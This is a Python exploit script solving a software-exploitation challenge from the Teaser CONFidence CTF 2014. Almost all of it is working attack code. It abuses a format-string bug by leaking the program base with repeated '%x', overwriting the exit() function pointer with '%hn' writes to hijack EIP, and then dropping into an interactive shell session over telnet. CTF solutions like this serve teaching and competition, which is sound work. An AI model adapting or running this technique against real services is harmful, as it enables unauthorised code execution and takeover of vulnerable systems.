#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Filename:         exploit.py
# Author:           Mateusz Jurczyk
# Task:             Multipurpose Calculation Machine
# Competition:      Teaser CONFidence CTF 2014
# Category:         Software exploitation
# Scoring:          200 pts (medium difficulty)
# Number of solves: 14 out of 99 participants

import struct
import socket
import telnetlib

def read_until(s, text):
  buffer = ""
  while len(buffer) < len(text):
    buffer += s.recv(1)
  while buffer[-len(text):] != text:
    buffer += s.recv(1)
  return buffer[:-len(text)]

def dd(x):
  return struct.pack("<I", x)

def exec_fmt_string(s, fmt):
  read_until(s, "Choice: ")

  assert(fmt[0:3] == "tan")
  assert(len(fmt) <= 63)
  s.send(fmt.ljust(63, "A"))

  read_until(s, "parameters: ")

  PARAMS = 9
  PARAM = "-2147483648"
  s.send("%d\n" % PARAMS)

  for _ in xrange(PARAMS):
    read_until(s, "parameter %d: " % (_ + 1))
    s.send("%s\n" % PARAM)

  read_until(s, "-2147483648]\n")
  return read_until(s, "[%s" % fmt)

def main():
  # Connect to the service.
  s = socket.socket()
  s.connect(("127.0.0.1", 1337))

  # Leak the program base address.
  leak = exec_fmt_string(s, "tan" + "%x " * 20)
  IMAGEBASE = int(leak[3:].split()[0], 16) - 0x3bc0

  # Calculate the expected value of hijacked EIP.
  FINAL_EIP = IMAGEBASE + 0xd20
  lo_final_eip = (FINAL_EIP & 0xffff)
  hi_final_eip = ((FINAL_EIP >> 16) & 0xffff)

  # Calculate the lengths of strings printed out by printf().
  INITIAL_BYTES_WRITTEN = 0x138
  lo_length = (lo_final_eip - INITIAL_BYTES_WRITTEN) & 0xffff
  hi_length = (hi_final_eip - lo_final_eip) & 0xffff

  # Craft a format string overwriting the exit() function pointer.
  FMT_STRING = "%%%dc%%130$hn%%%dc%%131$hn" % (lo_length, hi_length)
  ADDRS = dd(IMAGEBASE + 0x3ac8) + dd(IMAGEBASE + 0x3aca)
  exec_fmt_string(s, "tan_" +
                     FMT_STRING.ljust(40, "_") +
                     ADDRS.ljust(19, "_"))

  # Exit the program, triggering the invocation of the overwritten pointer.
  read_until(s, "Choice: ")
  s.send("quit")

  # Switch to interactive mode.
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

if __name__ == "__main__":
  main()
